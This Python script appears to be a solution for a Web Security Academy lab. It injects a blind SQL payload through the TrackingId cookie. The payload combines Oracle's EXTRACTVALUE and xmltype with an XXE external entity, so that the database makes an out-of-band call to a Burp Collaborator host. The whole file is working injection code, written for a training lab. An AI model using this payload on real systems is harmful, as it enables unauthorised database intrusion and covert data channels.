import requests
from urllib.parse import urlencode

URL = "https://0a1d008404702e68831ce72e002800f6.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Gifts"
}

def makeRequest(url=URL, path=PATH, query=QUERY, cookie=None):    
    response = requests.request(
    "GET",
    f"{URL}{PATH}",
    params=QUERY,
    cookies=cookie
    )
    return response

res = makeRequest()
cookies = res.cookies
BURP_COLLABORATOR_SUBDOMAIN = "749kdq5kbr6ev16vmb5kx27q0h69uzio.oastify.com"
DATA = f"""
(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{BURP_COLLABORATOR_SUBDOMAIN}/"> %remote;]>')
"""
ENCODED_DATA = urlencode({"":DATA})
PAYLOAD = f"{cookies.get('TrackingId')}' UNION SELECT EXTRACTVALUE {ENCODED_DATA.lstrip('=')},'/l') FROM dual -- "
modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
session = makeRequest(cookie=modified_cookies)
print(ENCODED_DATA.lstrip('='))
